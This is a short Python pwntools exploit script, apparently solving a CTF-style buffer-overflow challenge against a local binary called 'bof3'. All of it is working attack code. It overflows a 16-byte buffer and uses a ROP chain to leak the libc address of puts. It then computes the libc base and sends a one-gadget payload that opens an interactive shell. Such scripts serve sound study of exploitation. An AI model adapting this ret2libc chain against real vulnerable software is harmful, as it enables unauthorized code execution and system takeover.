from pwn import *

context.arch = 'amd64'

envdic = {
    'LD_PRELOAD' : './libc.so.6'
}

r = process('./bof3')


payload = 16 * 'a'
puts_got = 0x601018
pop_rdi = 0x400673
puts_plt = 0x4004a0
main = 0x4005b7

puts_libc = 0x809c0

raw_input('@')


r.sendline(payload + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main))

r.recvuntil('\n')

leak_puts = u64(r.recvuntil('\n').strip().ljust(8, '\x00'))
print hex(leak_puts)

base = leak_puts - puts_libc
print hex(base)

onegadget = base + 0x4f2c5

r.sendline(payload + p64(onegadget))

r.interactive()
